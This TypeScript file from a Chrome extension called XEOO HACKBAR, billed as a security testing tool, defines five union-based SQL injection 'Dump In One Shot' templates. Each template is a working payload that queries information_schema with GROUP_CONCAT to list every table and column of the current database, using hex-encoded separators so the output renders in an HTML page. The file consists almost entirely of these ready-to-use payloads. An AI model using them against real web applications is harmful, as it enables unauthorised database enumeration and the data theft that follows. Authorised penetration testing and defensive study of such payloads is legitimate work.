/**
 * XEOO HACKBAR — Security Testing & HTTP Inspection Chrome Extension
 * 
 * @module UnionBasedLocalDios
 * @author Zone Xploiter / ZXMarchia
 * @license MIT
 * @description Local database schema Dump In One Shot templates.
 */

import { BuilderSubcategory, BuilderTemplate } from '../../types';

export const localDiosTemplates: BuilderTemplate[] = [
  {
    id: 'local-dios-group-concat',
    name: 'Local DIOS group_concat()',
    description: 'Dumps all tables and columns from current active database using group_concat',
    content: '(SELECT GROUP_CONCAT(table_name,0x3a,column_name SEPARATOR 0x3c62723e) FROM information_schema.columns WHERE table_schema=database())'
  },
  {
    id: 'local-dios-concat-ws',
    name: 'Local DIOS concat_ws()',
    description: 'Dumps current database schema formatted with concat_ws and HTML break',
    content: '(SELECT GROUP_CONCAT(CONCAT_WS(0x3a,table_name,column_name) SEPARATOR 0x3c62723e) FROM information_schema.columns WHERE table_schema=database())'
  },
  {
    id: 'local-dios-list-tags',
    name: 'Local DIOS (HTML List <li>)',
    description: 'Dumps current database schema formatted as HTML list items',
    content: '(SELECT GROUP_CONCAT(0x3c6c693e,table_name,0x3a3a,column_name) FROM information_schema.columns WHERE table_schema=database())'
  },
  {
    id: 'local-dios-distinct-tables',
    name: 'Local Tables Only DIOS',
    description: 'Dumps only distinct table names from the current database',
    content: '(SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM information_schema.tables WHERE table_schema=database())'
  },
  {
    id: 'local-dios-hex-unquoted',
    name: 'Local DIOS Pure Hex (Unquoted)',
    description: 'Local schema extraction strictly using hex literals without quotes',
    content: '(SELECT GROUP_CONCAT(table_name,0x3a,column_name) FROM information_schema.columns WHERE (table_schema=database()))'
  }
];

export const localDiosSubcategory: BuilderSubcategory = {
  id: 'local-dios',
  label: 'Local Dios',
  description: 'Local schema Dump In One Shot templates filtered by database()',
  templates: localDiosTemplates
};
